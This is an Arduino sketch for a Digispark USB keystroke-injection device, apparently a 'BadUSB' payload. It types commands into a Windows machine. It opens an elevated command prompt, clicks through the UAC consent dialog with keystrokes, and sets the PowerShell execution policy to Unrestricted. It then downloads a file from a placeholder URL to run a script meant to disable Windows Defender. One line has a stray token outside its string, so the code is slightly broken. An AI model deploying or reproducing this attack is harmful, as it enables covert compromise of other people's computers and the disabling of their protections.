#include <DigiKeyboard.h>
/*Let the fun begins*/

void setup()
{
  pinMode(1, OUTPUT); //LED on Model A

  //Kill Windows Defender
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);//Open RUN
    DigiKeyboard.delay(1000);
    DigiKeyboard.print("cmd");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
    DigiKeyboard.delay(1000);
  
  DigiKeyboard.update();
  DigiKeyboard.delay(1000);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(100);
  DigiKeyboard.write('\t');
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  
    DigiKeyboard.println("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
    DigiKeyboard.delay(3000);
    DigiKeyboard.println("powershell (New-Object System.Net.WebClient).DownloadFile('https://YOURLINK','COMPLETEFILENAME')"); .\disable.ps1
    DigiKeyboard.delay(150000);


}  
void loop() {
  
  pinMode(1, OUTPUT); //LED on Model A ON

  pinMode(0, OUTPUT); //LED on Model A OFF

}
